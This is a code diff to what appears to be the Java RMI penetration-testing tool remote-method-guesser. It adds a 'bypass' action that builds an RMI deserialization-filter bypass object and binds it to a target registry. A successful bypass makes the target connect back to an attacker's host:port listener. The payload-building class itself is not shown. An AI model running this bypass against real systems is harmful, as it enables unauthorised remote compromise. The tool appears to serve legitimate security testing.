@@ -18,6 +18,7 @@ import de.qtc.rmg.io.WordlistHandler;
 import de.qtc.rmg.operations.DGCClient;
 import de.qtc.rmg.operations.MethodAttacker;
 import de.qtc.rmg.operations.MethodGuesser;
+import de.qtc.rmg.operations.RegistryClient;
 import de.qtc.rmg.utils.RMGUtils;
 import de.qtc.rmg.utils.RMIWhisperer;
 import de.qtc.rmg.utils.SampleWriter;
@@ -59,6 +60,9 @@ public class Starter {
 
                 System.setProperty("java.rmi.server.codebase", serverAddress);
             }
+
+            if( action.equals("bypass") )
+                parser.checkArgumentCount(4);
         }
 
         Properties config = new Properties();
@@ -102,8 +106,9 @@ public class Starter {
         HashMap<String,String> allClasses = null;
         ArrayList<HashMap<String,String>> boundClasses = null;
 
-        if( !action.contains("dgc") ) {
+        if( !action.contains("dgc") && !action.equals("bypass") ) {
             rmi.locateRegistry();
+
             boundNames = rmi.getBoundNames(boundName);
 
             boundClasses = rmi.getClassNames(boundNames);
@@ -239,6 +244,29 @@ public class Starter {
                     DGCClient dgc = new DGCClient(rmi);
                     dgc.codebaseCleanCall(payload);
                 }
+
+                break;
+
+            case "bypass":
+
+                String listener = parser.getPositionalString(3);
+                String[] split = listener.split(":");
+
+                if( split.length != 2 || !split[1].matches("\\d+") ) {
+                    Logger.eprintlnMixedYellow("Listener must be specified as", "host:port");
+                    RMGUtils.exit();
+                }
+
+                String listenerHost = split[0];
+                int listenerPort = Integer.valueOf(split[1]);
+
+                Logger.printlnBlue("Attempting RMI deserialization filter bypass.");
+                Logger.increaseIndent();
+                Logger.printlnMixedBlue("Successful bypass will trigger an outbout connection to", listenerHost + ":" + listenerPort);
+
+                RegistryClient registryClient = new RegistryClient(rmi);
+                Object payloadObject = registryClient.generateBypassObject(listenerHost, listenerPort);
+                registryClient.bindCall(payloadObject);
 
                 break;
 
